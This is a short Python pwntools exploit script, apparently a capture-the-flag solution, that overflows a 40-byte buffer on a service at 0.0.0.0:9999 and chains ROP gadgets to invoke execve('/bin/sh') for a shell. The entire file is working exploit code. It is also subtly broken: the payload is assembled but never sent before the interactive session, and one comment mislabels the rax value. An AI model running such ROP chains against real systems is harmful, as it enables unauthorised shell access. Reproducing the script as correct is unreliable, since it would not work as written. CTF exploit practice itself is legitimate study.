#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 howpwn <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

p = remote("0.0.0.0", 9999)
context.arch = "amd64"
p.recvuntil("Your input :")

# padding 40

payload = "A"*40


# gadget 
pop_rax_rdx_rbx = 0x0000000000478636
pop_rdi = 0x00000000004014c6
buf = 0x6cbb60
pop_rdx = 0x0000000000442896
mov_prdi_rdx = 0x0000000000435453
pop_rsi = 0x00000000004015e7
systemcall = 0x0000000000467265
# rdi = buffer address
payload += flat([pop_rdi, buf])
# rdx = "/bin/sh\x00"
payload += flat([pop_rdx, "/bin/sh\x00"])
# *rdi = "/bin/sh\x00"
payload += flat([mov_prdi_rdx])
# rsi = 0
payload += flat([pop_rsi, 0])
# rax = 0, rdx = 0
payload += flat([pop_rax_rdx_rbx, 0x3b, 0, 0])
# system call
payload += flat([systemcall])

p.interactive()

